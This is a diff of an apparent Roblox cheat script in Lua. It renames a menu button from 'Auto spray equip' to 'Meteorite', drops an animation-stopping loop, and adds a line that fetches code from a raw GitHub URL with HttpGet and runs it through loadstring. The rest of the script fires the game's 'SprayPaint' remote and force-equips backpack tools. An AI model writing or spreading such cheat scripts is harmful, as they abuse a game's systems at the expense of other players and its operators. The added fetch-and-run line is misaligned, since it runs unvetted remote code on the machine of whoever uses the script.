@@ -468,9 +468,8 @@ end
 })
 
 Tab:AddButton({
-	Name = "Auto spray equip",
+	Name = "Meteorite",
 	Callback = function()
-while wait() do
 local args = {
     [1] = "SprayPaint"
 }
@@ -482,13 +481,7 @@ for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
             v.Parent = game.Players.LocalPlayer.Character
     end
 end
-
-for _, v in pairs(game.Players.LocalPlayer.Character.Humanoid:GetPlayingAnimationTracks()) do
-v:Stop() 
-end
-wait(10)
-end
-
+loadstring(game:HttpGet("https://raw.githubusercontent.com/zxclua/TimurkaProLuaCoder228/main/MMMMMMEtttttOOrrrrrIiiittttt", true))()
   	end    
 })
 
